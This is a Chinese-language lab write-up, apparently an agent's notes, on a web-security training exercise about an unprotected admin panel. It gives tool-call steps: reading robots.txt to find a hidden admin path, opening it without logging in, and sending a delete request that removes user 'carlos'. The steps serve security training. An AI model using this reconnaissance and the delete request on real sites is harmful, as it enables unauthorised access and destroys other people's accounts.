---
title: "records/lab-unprotected-admin-functionality"
---

# records/lab-unprotected-admin-functionality

# Lab: Unprotected admin functionality (未认证管理面)

## 判型
访问控制族「未认证面」子型:管理接口整体缺失访问控制,入口路径由 robots.txt 泄露。
判型锚点 = 匿名身份直达管理页且管理动作(删除用户)生效,请求仅被放行不算解。

## 链路(全走件)
1. `page_read <lab-page-url>` 取 widget lab_id(64 位 hex)。
2. `range_launch launch <lab_id> --jar /tmp/cj1.json` → instance_url。
3. `http_session get <inst>/robots.txt` → `Disallow: /administrator-panel`。
4. `http_session get <inst>/administrator-panel` → 匿名 200,页面列 wiener / carlos 与各自 delete 链接。
5. `http_session get <inst>/administrator-panel/delete?username=carlos` → 302 `/administrator-panel`。
6. `banner_verdict <inst>/ --jar` → `solved:true` + `<h4>Congratulations, you solved the lab!</h4>`。

## 要点
- 管理面无会话或角色门:匿名 jar 直接读页并删人,不需要任何登录。
- 路径泄露首选侦察点 = robots.txt 的 Disallow 行。
- 与 [[records/independent-idor]] 的区别:IDOR 是对象级判定缺位(改 id 越权),本题是功能级入口整体无鉴权。
- `range_launch` 的 widget lab_id 与 URL slug 不同一:直接传 slug 返回 404(带认证 jar 亦然),必须先经 page_read 取 hex id。

## 相关
- [[access-control-family]]
